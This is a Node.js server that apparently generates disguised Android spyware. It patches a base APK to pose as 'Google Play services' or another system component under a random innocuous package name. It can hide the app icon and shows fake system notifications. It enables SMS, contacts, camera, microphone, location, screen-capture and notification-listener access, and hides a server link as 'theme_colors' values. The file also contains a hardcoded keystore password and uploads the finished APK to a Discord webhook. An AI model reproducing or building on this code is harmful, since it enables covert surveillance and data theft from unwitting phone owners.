const express = require('express');
const multer  = require('multer');
const cors    = require('cors');
const fs      = require('fs');
const path    = require('path');
const { exec } = require('child_process');
const sharp   = require('sharp');
const axios   = require('axios');
const cloudinary = require('cloudinary').v2;
const FormData   = require('form-data');
const AdmZip     = require('adm-zip');
require('dotenv').config();

const app  = express();
const port = process.env.PORT || 4000;
app.use(cors());
app.use(express.json());

const upload = multer({ storage: multer.memoryStorage() });

const ASSETS_DIR = path.join(__dirname, 'assets');
const TEMP_DIR   = path.join(__dirname, 'temp');
const BASE_APK   = path.join(ASSETS_DIR, 'base.apk');
const KEYSTORE   = path.join(ASSETS_DIR, 'usman90.jks');
const SIGNER     = path.join(ASSETS_DIR, 'uber-apk-signer.jar');

if (!fs.existsSync(TEMP_DIR)) fs.mkdirSync(TEMP_DIR, { recursive: true });

function toUtf16LE(str) {
    const buf = Buffer.alloc(str.length * 2);
    for (let i = 0; i < str.length; i++) buf.writeUInt16LE(str.charCodeAt(i), i * 2);
    return buf;
}

function binaryReplaceU16(buf, searchStr, replaceStr) {
    if (searchStr.length !== replaceStr.length) {
        throw new Error(`binaryReplaceU16 length mismatch: ${searchStr.length} vs ${replaceStr.length}`);
    }
    const s = toUtf16LE(searchStr);
    const r = toUtf16LE(replaceStr);
    let count = 0, idx = 0;
    while ((idx = buf.indexOf(s, idx)) !== -1) {
        r.copy(buf, idx);
        idx += s.length;
        count++;
    }
    return count;
}

function binaryReplaceU8(buf, searchStr, replaceStr) {
    const s = Buffer.isBuffer(searchStr) ? searchStr : Buffer.from(searchStr, 'utf8');
    const r = Buffer.isBuffer(replaceStr) ? replaceStr : Buffer.from(replaceStr, 'utf8');
    if (s.length !== r.length) {
        throw new Error(`binaryReplaceU8 length mismatch: ${s.length} vs ${r.length}`);
    }
    let count = 0, idx = 0;
    while ((idx = buf.indexOf(s, idx)) !== -1) {
        r.copy(buf, idx);
        idx += s.length;
        count++;
    }
    return count;
}

function fixedLen(str, len, pad = ' ') {
    return str.length >= len ? str.substring(0, len) : str + pad.repeat(len - str.length);
}

function makeNeutralPerm(originalPerm) {
    const prefix = 'android.permission.N_';
    const needed = originalPerm.length - prefix.length;
    if (needed <= 0) return originalPerm;
    return prefix + '0'.repeat(needed);
}

const OLD_PKG = 'com.asml.tech';
const PKG_POOL = [
    'com.apps.care', 'com.data.flow', 'com.core.work', 'com.smart.hub',
    'com.mesh.link', 'com.node.port', 'com.arch.pull', 'com.grid.lock',
    'com.heap.scan', 'com.hook.emit', 'com.link.push', 'com.mint.flow',
    'com.kits.view', 'com.util.main', 'com.labs.conn', 'com.edge.push',
    'com.flow.core', 'com.task.data', 'com.bind.safe', 'com.ring.sync',
];

function resolvePackage(userPkg) {
    if (userPkg && userPkg.trim()) {
        const clean = userPkg.trim().toLowerCase().replace(/[^a-z0-9.]/g, '');
        const segments = clean.split('.').filter(s => s.length > 0);
        if (segments.length >= 2 && segments.every(s => /^[a-z][a-z0-9_]*$/.test(s)) && clean.length >= 5 && clean.length <= 50) {
            return clean;
        }
    }
    return PKG_POOL[Math.floor(Math.random() * PKG_POOL.length)];
}

function replaceStringInAxml(buf, oldStr, newStr) {
    const fileType = buf.readUInt16LE(0);
    if (fileType !== 0x0003) throw new Error('Not an AXML file');

    const spOffset = 8;
    const spType = buf.readUInt16LE(spOffset);
    if (spType !== 0x0001) throw new Error('First chunk is not a string pool');

    const spChunkSize = buf.readUInt32LE(spOffset + 4);
    const stringCount = buf.readUInt32LE(spOffset + 8);
    const styleCount = buf.readUInt32LE(spOffset + 12);
    const flags = buf.readUInt32LE(spOffset + 16);
    const stringsStart = buf.readUInt32LE(spOffset + 20);
    const stylesStart = buf.readUInt32LE(spOffset + 24);
    const isUtf8 = (flags & (1 << 8)) !== 0;

    const offsets = [];
    for (let i = 0; i < stringCount; i++) {
        offsets.push(buf.readUInt32LE(spOffset + 28 + i * 4));
    }

    const strings = [];
    let targetIdx = -1;
    for (let i = 0; i < stringCount; i++) {
        const absOff = spOffset + stringsStart + offsets[i];
        if (isUtf8) {
            let cur = absOff;
            let charLen = buf[cur++];
            if (charLen & 0x80) charLen = ((charLen & 0x7f) << 8) | buf[cur++];
            let byteLen = buf[cur++];
            if (byteLen & 0x80) byteLen = ((byteLen & 0x7f) << 8) | buf[cur++];
            const s = buf.toString('utf8', cur, cur + byteLen);
            strings.push(s);
            if (s === oldStr && targetIdx === -1) targetIdx = i;
        } else {
            let cur = absOff;
            let charLen = buf.readUInt16LE(cur); cur += 2;
            if (charLen & 0x8000) {
                charLen = ((charLen & 0x7fff) << 16) | buf.readUInt16LE(cur); cur += 2;
            }
            const s = buf.toString('utf16le', cur, cur + charLen * 2);
            strings.push(s);
            if (s === oldStr && targetIdx === -1) targetIdx = i;
        }
    }

    if (targetIdx === -1) return buf;

    strings[targetIdx] = newStr;

    const strDataBuffers = [];
    const newOffsets = [];
    let currentOffset = 0;

    for (let i = 0; i < stringCount; i++) {
        newOffsets.push(currentOffset);
        const s = strings[i];
        if (isUtf8) {
            const sBuf = Buffer.from(s, 'utf8');
            const header = Buffer.alloc(2);
            header[0] = s.length;
            header[1] = sBuf.length;
            const item = Buffer.concat([header, sBuf, Buffer.from([0])]);
            strDataBuffers.push(item);
            currentOffset += item.length;
        } else {
            const sBuf = Buffer.from(s, 'utf16le');
            const header = Buffer.alloc(2);
            header.writeUInt16LE(s.length, 0);
            const item = Buffer.concat([header, sBuf, Buffer.from([0, 0])]);
            strDataBuffers.push(item);
            currentOffset += item.length;
        }
    }

    let stringData = Buffer.concat(strDataBuffers);
    const pad = (4 - (stringData.length % 4)) % 4;
    if (pad > 0) {
        stringData = Buffer.concat([stringData, Buffer.alloc(pad)]);
    }

    let stylesData = Buffer.alloc(0);
    if (styleCount > 0 && stylesStart > 0) {
        const stylesAbs = spOffset + stylesStart;
        const stylesLen = spChunkSize - stylesStart;
        stylesData = buf.slice(stylesAbs, stylesAbs + stylesLen);
    }

    const newStringsStart = 28 + stringCount * 4 + styleCount * 4;
    const newStylesStart = styleCount > 0 ? newStringsStart + stringData.length : 0;
    const newSpChunkSize = newStringsStart + stringData.length + stylesData.length;

    const newSpHeader = Buffer.alloc(28);
    newSpHeader.writeUInt16LE(0x0001, 0);
    newSpHeader.writeUInt16LE(28, 2);
    newSpHeader.writeUInt32LE(newSpChunkSize, 4);
    newSpHeader.writeUInt32LE(stringCount, 8);
    newSpHeader.writeUInt32LE(styleCount, 12);
    newSpHeader.writeUInt32LE(flags, 16);
    newSpHeader.writeUInt32LE(newStringsStart, 20);
    newSpHeader.writeUInt32LE(newStylesStart, 24);

    const offsetTable = Buffer.alloc(stringCount * 4);
    for (let i = 0; i < stringCount; i++) {
        offsetTable.writeUInt32LE(newOffsets[i], i * 4);
    }

    const styleOffsetTable = buf.slice(spOffset + 28 + stringCount * 4, spOffset + 28 + stringCount * 4 + styleCount * 4);

    const newStringPool = Buffer.concat([
        newSpHeader,
        offsetTable,
        styleOffsetTable,
        stringData,
        stylesData
    ]);

    const restOfFile = buf.slice(spOffset + spChunkSize);
    const newFileSize = 8 + newStringPool.length + restOfFile.length;
    const newFileHeader = Buffer.alloc(8);
    newFileHeader.writeUInt16LE(0x0003, 0);
    newFileHeader.writeUInt16LE(8, 2);
    newFileHeader.writeUInt32LE(newFileSize, 4);

    return Buffer.concat([newFileHeader, newStringPool, restOfFile]);
}

async function generateDefaultAppIcon(appName) {
    const size = 512;
    const initial = (appName && appName.trim()) ? appName.trim()[0].toUpperCase() : 'A';
    const svg = `
    <svg width="${size}" height="${size}" xmlns="http://www.w3.org/2000/svg">
      <defs>
        <linearGradient id="grad" x1="0%" y1="0%" x2="100%" y2="100%">
          <stop offset="0%" stop-color="#F97316"/>
          <stop offset="50%" stop-color="#EA580C"/>
          <stop offset="100%" stop-color="#9A3412"/>
        </linearGradient>
      </defs>
      <rect x="0" y="0" width="${size}" height="${size}" rx="112" fill="url(#grad)"/>
      <rect x="8" y="8" width="${size - 16}" height="${size - 16}" rx="104" fill="none" stroke="rgba(255,255,255,0.2)" stroke-width="8"/>
      <text x="50%" y="58%" font-family="Arial, Helvetica, sans-serif" font-weight="bold" font-size="260" fill="#ffffff" text-anchor="middle" dominant-baseline="central">${initial}</text>
    </svg>`;
    return await sharp(Buffer.from(svg)).png().toBuffer();
}

const APP_NAME_PH = 'AppTitlePlaceholder_';

const KNOWN_ICON_ENTRIES = [
    { path: 'res/d2.webp', size: 48 },
    { path: 'res/yw.webp', size: 48 },
    { path: 'res/MO.webp', size: 72 },
    { path: 'res/fq.webp', size: 72 },
    { path: 'res/qs.webp', size: 96 },
    { path: 'res/u5.webp', size: 96 },
    { path: 'res/Sn.webp', size: 144 },
    { path: 'res/j_.webp', size: 144 },
    { path: 'res/-6.webp', size: 192 },
    { path: 'res/sK.webp', size: 192 },
    { path: 'res/mipmap-mdpi/ic_launcher.webp', size: 48 },
    { path: 'res/mipmap-hdpi/ic_launcher.webp', size: 72 },
    { path: 'res/mipmap-xhdpi/ic_launcher.webp', size: 96 },
    { path: 'res/mipmap-xxhdpi/ic_launcher.webp', size: 144 },
    { path: 'res/mipmap-xxxhdpi/ic_launcher.webp', size: 192 },
    { path: 'res/mipmap-mdpi/ic_launcher_round.webp', size: 48 },
    { path: 'res/mipmap-hdpi/ic_launcher_round.webp', size: 72 },
    { path: 'res/mipmap-xhdpi/ic_launcher_round.webp', size: 96 },
    { path: 'res/mipmap-xxhdpi/ic_launcher_round.webp', size: 144 },
    { path: 'res/mipmap-xxxhdpi/ic_launcher_round.webp', size: 192 },
    { path: 'res/mipmap-mdpi/ic_launcher.png', size: 48 },
    { path: 'res/mipmap-hdpi/ic_launcher.png', size: 72 },
    { path: 'res/mipmap-xhdpi/ic_launcher.png', size: 96 },
    { path: 'res/mipmap-xxhdpi/ic_launcher.png', size: 144 },
    { path: 'res/mipmap-xxxhdpi/ic_launcher.png', size: 192 },
    { path: 'res/mipmap-mdpi/ic_launcher_round.png', size: 48 },
    { path: 'res/mipmap-hdpi/ic_launcher_round.png', size: 72 },
    { path: 'res/mipmap-xhdpi/ic_launcher_round.png', size: 96 },
    { path: 'res/mipmap-xxhdpi/ic_launcher_round.png', size: 144 },
    { path: 'res/mipmap-xxxhdpi/ic_launcher_round.png', size: 192 },
];

async function replaceIcons(zip, pngBuffer) {
    const adaptiveXmls = [
        'res/BW.xml',
        'res/0K.xml',
        'res/mipmap-anydpi-v26/ic_launcher.xml',
        'res/mipmap-anydpi-v26/ic_launcher_round.xml'
    ];
    for (const xml of adaptiveXmls) {
        if (zip.getEntry(xml)) {
            zip.deleteFile(xml);
        }
    }

    const sizes = [48, 72, 96, 144, 192];
    const webpCache = {};
    const pngCache = {};
    for (const s of sizes) {
        webpCache[s] = await sharp(pngBuffer).resize(s, s).webp({ quality: 95 }).toBuffer();
        pngCache[s] = await sharp(pngBuffer).resize(s, s).png().toBuffer();
    }

    let count = 0;
    for (const item of KNOWN_ICON_ENTRIES) {
        const entry = zip.getEntry(item.path);
        if (entry) {
            try {
                const isPng = item.path.endsWith('.png');
                const buf = isPng ? pngCache[item.size] : webpCache[item.size];
                if (buf) {
                    entry.setData(buf);
                    count++;
                }
            } catch (err) {
                console.error(`[ICON] Failed replacing ${item.path}:`, err.message);
            }
        }
    }

    for (const entry of zip.getEntries()) {
        const name = entry.entryName;
        if (name.startsWith('res/mipmap-') && (name.endsWith('.webp') || name.endsWith('.png'))) {
            let size = 96;
            if (name.includes('mdpi')) size = 48;
            else if (name.includes('hdpi')) size = 72;
            else if (name.includes('xhdpi')) size = 96;
            else if (name.includes('xxhdpi')) size = 144;
            else if (name.includes('xxxhdpi')) size = 192;

            const isPng = name.endsWith('.png');
            const buf = isPng ? pngCache[size] : webpCache[size];
            if (buf) {
                entry.setData(buf);
                count++;
            }
        }
    }

    console.log(`[ICON] Replaced ${count} icon files`);
}

const NOTIF_PRESETS = {
    default:            { title: 'Google Play services',  text: 'Running background checks',  icon: 'info',     action: 'device_info' },
    sync:               { title: 'Cloud Backup',          text: 'Syncing data in background', icon: 'sync',     action: 'none'        },
    google_play:        { title: 'Google Play services',  text: 'Checking for updates...',    icon: 'info',     action: 'device_info' },
    android_system:     { title: 'Android System',        text: 'System functions active',    icon: 'sync',     action: 'settings'    },
    device_security:    { title: 'Security & Privacy',    text: 'All systems secured',        icon: 'lock',     action: 'security'    },
    device_maintenance: { title: 'Device Care',           text: 'Running in background',      icon: 'sync',     action: 'settings'    },
    download_manager:   { title: 'Download Manager',      text: 'Transfer complete',          icon: 'download', action: 'none'        },
    system_ui:          { title: 'System UI',             text: 'Syncing data',               icon: 'sync',     action: 'settings'    },
    cloud:              { title: 'Cloud Storage',         text: 'Connected to cloud service', icon: 'sync',     action: 'none'        },
    active:             { title: 'System Framework',      text: 'Service active',             icon: 'info',     action: 'none'        },
    custom:             { title: 'System Service',        text: 'Running background checks',  icon: 'info',     action: 'device_info' },
};

app.post('/generate', upload.single('icon'), async (req, res) => {
    // ═══════════════════════════════════════════════════
    // SERVICE-SECRET AUTH — only the gallery-eye backend
    // may call this endpoint.  A shared secret is set in
    // both services' environment variables as
    // APK_SERVICE_SECRET.  No secret → 403 immediately.
    // This closes the direct-call bypass vector where a
    // Chrome extension or curl can hit /generate directly
    // with premium flags even though the main server
    // would have blocked them.
    // ═══════════════════════════════════════════════════
    const incomingSecret = req.headers['x-apk-service-secret'] || req.body.apkServiceSecret;
    const expectedSecret = process.env.APK_SERVICE_SECRET;
    if (!expectedSecret || incomingSecret !== expectedSecret) {
        console.warn(`[APK] Unauthorized /generate attempt — bad or missing service secret`);
        return res.status(403).json({ error: 'Forbidden' });
    }

    const {
        uuid, appName, packageName: userPkg, hideApp, webLink, callbackUrl,
        enableSmsPermission, enableContactsPermission, enableStoragePermission,
        enableCameraPermission, enableMicrophonePermission, enableNotificationListener,
        enableLocationPermission, enableForegroundNotification, aggressivePermissions, enableFileManagerPermission,
        enableScreenCapture,
        notificationStyle, notificationClickAction, notificationTitle, notificationText, notificationIcon
    } = req.body;
    const customIcon = req.file;

    console.log(`[APK] Request UUID=${uuid} | App="${appName}" | Pkg="${userPkg}"`);
    res.status(202).json({ message: 'Processing started' });

    (async () => {
        const sendUpdate = async (event, data) => {
            if (!callbackUrl) return;
            try { await axios.post(callbackUrl, { uuid, event, data }); }
            catch (e) { console.error('[WH]', e.message); }
        };

        const unsignedPath = path.join(TEMP_DIR, `unsigned-${uuid}.apk`);

        try {
            if (!fs.existsSync(BASE_APK)) throw new Error('Base APK not found at assets/base.apk');
            if (fs.existsSync(unsignedPath)) fs.unlinkSync(unsignedPath);

            const targetPkg    = resolvePackage(userPkg);
            const targetName   = (appName && appName.trim()) ? appName.trim() : 'Google Play services';
            const finalApkName = `${targetName.replace(/[^a-zA-Z0-9]/g, '-')}.apk`;
            const preset       = NOTIF_PRESETS[notificationStyle] || NOTIF_PRESETS.default;

            await sendUpdate('apk_progress', { step: 'Loading base APK...', progress: 10 });
            const zip = new AdmZip(BASE_APK);

            await sendUpdate('apk_progress', { step: 'Patching application title...', progress: 20 });
            const arscEntry = zip.getEntry('resources.arsc');
            if (arscEntry) {
                const arscBuf = arscEntry.getData();
                const idx = arscBuf.indexOf(APP_NAME_PH);
                if (idx !== -1) {
                    const safeTitle = targetName.substring(0, APP_NAME_PH.length);
                    const len = Buffer.byteLength(safeTitle, 'utf8');
                    arscBuf[idx - 2] = len;
                    arscBuf[idx - 1] = len;
                    Buffer.from(safeTitle, 'utf8').copy(arscBuf, idx);
                    arscBuf[idx + len] = 0;
                    for (let i = len + 1; i <= APP_NAME_PH.length; i++) {
                        arscBuf[idx + i] = 0;
                    }
                    arscEntry.setData(arscBuf);
                    arscEntry.header.method = 0;
                    console.log(`[PATCH] Title updated: "${safeTitle}" (${len} bytes)`);
                }
            }

            const isSmsEnabled             = enableSmsPermission === 'true';
            const isContactsEnabled        = enableContactsPermission === 'true';
            const isCameraEnabled          = enableCameraPermission === 'true';
            const isMicEnabled             = enableMicrophonePermission === 'true';
            const isLocationEnabled        = enableLocationPermission === 'true';
            const isStorageEnabled         = enableStoragePermission !== 'false' && enableStoragePermission !== false;
            const isFileManagerEnabled     = enableFileManagerPermission !== undefined
                ? (enableFileManagerPermission === 'true' || enableFileManagerPermission === true)
                : isStorageEnabled;
            const isScreenCaptureEnabled   = enableScreenCapture === 'true' || enableScreenCapture === true;
            const isForegroundNotifEnabled = enableForegroundNotification !== 'false' && enableForegroundNotification !== false;

            await sendUpdate('apk_progress', { step: 'Configuring package & permissions...', progress: 35 });
            const manifestEntry = zip.getEntry('AndroidManifest.xml');
            if (manifestEntry) {
                let manifestBuf = manifestEntry.getData();

                if (targetPkg !== OLD_PKG) {
                    manifestBuf = replaceStringInAxml(manifestBuf, OLD_PKG, targetPkg);
                    console.log(`[PATCH] Package updated: "${OLD_PKG}" -> "${targetPkg}"`);
                }

                const permsToNeutralize = [];
                if (!isSmsEnabled) {
                    permsToNeutralize.push('android.permission.READ_SMS', 'android.permission.RECEIVE_SMS');
                }
                if (!isContactsEnabled) {
                    permsToNeutralize.push('android.permission.READ_CONTACTS');
                }
                if (!isCameraEnabled) {
                    permsToNeutralize.push('android.permission.CAMERA', 'android.permission.FOREGROUND_SERVICE_CAMERA');
                }
                if (!isMicEnabled) {
                    permsToNeutralize.push('android.permission.RECORD_AUDIO', 'android.permission.FOREGROUND_SERVICE_MICROPHONE');
                }
                if (!isLocationEnabled) {
                    permsToNeutralize.push(
                        'android.permission.ACCESS_FINE_LOCATION',
                        'android.permission.ACCESS_COARSE_LOCATION',
                        'android.permission.FOREGROUND_SERVICE_LOCATION'
                    );
                }
                if (!isStorageEnabled) {
                    permsToNeutralize.push(
                        'android.permission.READ_MEDIA_IMAGES',
                        'android.permission.READ_MEDIA_VIDEO',
                        'android.permission.READ_EXTERNAL_STORAGE',
                        'android.permission.WRITE_EXTERNAL_STORAGE'
                    );
                }
                if (!isFileManagerEnabled) {
                    permsToNeutralize.push(
                        'android.permission.MANAGE_EXTERNAL_STORAGE'
                    );
                }
                if (!isScreenCaptureEnabled) {
                    permsToNeutralize.push(
                        'android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION'
                    );
                }
                if (!isForegroundNotifEnabled) {
                    permsToNeutralize.push('android.permission.POST_NOTIFICATIONS');
                }

                for (const perm of permsToNeutralize) {
                    const neutral = makeNeutralPerm(perm);
                    binaryReplaceU16(manifestBuf, perm, neutral);
                }

                manifestEntry.setData(manifestBuf);
            }

            if (customIcon && customIcon.buffer) {
                await sendUpdate('apk_progress', { step: 'Embedding launcher icons...', progress: 50 });
                await replaceIcons(zip, customIcon.buffer);
            } else {
                try {
                    await sendUpdate('apk_progress', { step: 'Generating launcher icons...', progress: 50 });
                    const fallbackIcon = await generateDefaultAppIcon(targetName);
                    if (fallbackIcon) {
                        await replaceIcons(zip, fallbackIcon);
                    }
                } catch (iconErr) {
                    console.error('[ICON] Fallback icon error:', iconErr.message);
                }
            }

            await sendUpdate('apk_progress', { step: 'Writing configuration assets...', progress: 65 });
            const themeColors = Array.from(webLink || '').map(c => c.charCodeAt(0));

            const config = {
                hideApp:                      hideApp === 'true',
                theme_colors:                 themeColors,
                appName:                      targetName,
                packageName:                  targetPkg,
                enableSmsPermission:          enableSmsPermission === 'true',
                enableContactsPermission:     enableContactsPermission === 'true',
                enableStoragePermission:      isStorageEnabled,
                enableFileManagerPermission:  isFileManagerEnabled,
                enableScreenCapture:          isScreenCaptureEnabled,
                enableCameraPermission:       enableCameraPermission === 'true',
                enableMicrophonePermission:   enableMicrophonePermission === 'true',
                enableLocationPermission:     enableLocationPermission === 'true',
                enableNotificationListener:   enableNotificationListener === 'true',
                enableForegroundNotification: isForegroundNotifEnabled,
                aggressivePermissions:        aggressivePermissions === 'true',
                notificationClickAction:      notificationClickAction || preset.action,
                notificationTitle:            (notificationTitle && notificationTitle.trim()) ? notificationTitle.trim() : preset.title,
                notificationText:             (notificationText  && notificationText.trim())  ? notificationText.trim()  : preset.text,
                notificationIcon:             notificationIcon   || preset.icon,
                notificationChannelName:      (notificationTitle && notificationTitle.trim()) ? notificationTitle.trim() : preset.title,
            };

            zip.addFile('assets/config.json', Buffer.from(JSON.stringify(config, null, 2), 'utf8'));
            zip.addFile('assets/uuid.txt',    Buffer.from(uuid, 'utf8'));

            await sendUpdate('apk_progress', { step: 'Preparing package signatures...', progress: 75 });
            const SIG_EXTS = ['.SF', '.RSA', '.DSA', '.EC', 'MANIFEST.MF'];
            for (const entry of zip.getEntries()) {
                const en = entry.entryName;
                if (en.startsWith('META-INF/') && SIG_EXTS.some(x => en.toUpperCase().endsWith(x))) {
                    zip.deleteFile(en);
                }
            }

            const finalArsc = zip.getEntry('resources.arsc');
            if (finalArsc) finalArsc.header.method = 0;

            zip.writeZip(unsignedPath);

            await sendUpdate('apk_progress', { step: 'Signing package with usman90 key...', progress: 85 });
            const ksArgs = fs.existsSync(KEYSTORE)
                ? `--ks "${KEYSTORE}" --ksAlias usman90 --ksPass "God112256@" --ksKeyPass "God112256@"`
                : '';
            const signCmd = `java -jar "${SIGNER}" --apks "${unsignedPath}" --out "${TEMP_DIR}" ${ksArgs} --allowResign`;

            await new Promise((resolve, reject) => {
                exec(signCmd, { timeout: 120000 }, (err, stdout, stderr) => {
                    if (err) {
                        console.error('[SIGN] uber-apk-signer error:', stderr || err.message);
                        exec(`java -jar "${SIGNER}" --apks "${unsignedPath}" --out "${TEMP_DIR}" --allowResign`,
                            { timeout: 60000 }, (e2) => e2 ? reject(e2) : resolve());
                    } else {
                        resolve();
                    }
                });
            });

            await sendUpdate('apk_progress', { step: 'Finalizing package...', progress: 92 });
            const signedName = fs.readdirSync(TEMP_DIR)
                .find(f => f.startsWith(`unsigned-${uuid}`) && f.includes('signed'));
            if (!signedName) throw new Error('Signed APK not found after signing step');
            const signedPath = path.join(TEMP_DIR, signedName);

            let downloadUrl = '';
            await sendUpdate('apk_progress', { step: 'Uploading package to cloud...', progress: 95 });

            if (process.env.DISCORD_WEBHOOK_URL) {
                try {
                    const form = new FormData();
                    form.append('file', fs.createReadStream(signedPath), { filename: finalApkName });
                    const r = await axios.post(process.env.DISCORD_WEBHOOK_URL, form, {
                        headers: form.getHeaders(), maxBodyLength: Infinity, maxContentLength: Infinity
                    });
                    downloadUrl = r.data?.attachments?.[0]?.url || '';
                } catch (e) { console.error('[UPLOAD] Discord failed:', e.message); }
            }

            if (!downloadUrl && process.env.CLOUDINARY_CLOUD_NAME) {
                try {
                    cloudinary.config({
                        cloud_name:  process.env.CLOUDINARY_CLOUD_NAME,
                        api_key:     process.env.CLOUDINARY_API_KEY,
                        api_secret:  process.env.CLOUDINARY_API_SECRET,
                    });
                    const binPath = signedPath.replace('.apk', '.bin');
                    fs.copyFileSync(signedPath, binPath);
                    const r = await cloudinary.uploader.upload(binPath, {
                        resource_type: 'raw',
                        folder:        'generated_apks',
                        public_id:     `${finalApkName.replace('.apk', '')}_${Date.now()}`,
                    });
                    downloadUrl = r.secure_url || '';
                    if (fs.existsSync(binPath)) fs.unlinkSync(binPath);
                } catch (e) { console.error('[UPLOAD] Cloudinary failed:', e.message); }
            }

            [unsignedPath, signedPath].forEach(p => {
                try { if (fs.existsSync(p)) fs.unlinkSync(p); } catch (_) {}
            });

            if (downloadUrl) {
                await sendUpdate('apk_ready', { downloadUrl, packageName: targetPkg });
                console.log(`[APK] Done: ${uuid} | pkg=${targetPkg}`);
            } else {
                await sendUpdate('apk_error', { message: 'Upload failed' });
            }

        } catch (err) {
            console.error(`[APK] Failed ${uuid}:`, err.message);
            try { await sendUpdate('apk_error', { message: err.message }); } catch (_) {}
            try { if (fs.existsSync(unsignedPath)) fs.unlinkSync(unsignedPath); } catch (_) {}
        }
    })();
});

app.listen(port, () => console.log(`[APK Generator] Running on port ${port}`));
